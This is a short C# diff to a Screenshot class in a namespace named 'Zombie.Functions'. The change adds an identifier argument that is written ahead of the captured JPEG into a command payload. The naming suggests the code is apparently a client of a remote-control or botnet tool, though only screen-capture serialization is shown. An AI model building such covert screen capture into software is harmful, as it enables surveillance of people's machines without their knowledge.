@@ -16,7 +16,7 @@ namespace Zombie.Functions
 {
     public static class Screenshot
     {
-        public static byte[] Take()
+        public static byte[] Take(string identifier)
         {
             byte[] img;
 
@@ -39,7 +39,7 @@ namespace Zombie.Functions
                 bmpScreenshot.Save(ms, ImageFormat.Jpeg);
                 img = ms.ToArray();
             }
-            return CommandDataSerializer.Serialize(CommandFlags.Screenshot, (writer) => { writer.Write(img); });
+            return CommandDataSerializer.Serialize(CommandFlags.Screenshot, (writer) => { writer.Write(identifier); writer.Write(img); });
 
         }
 
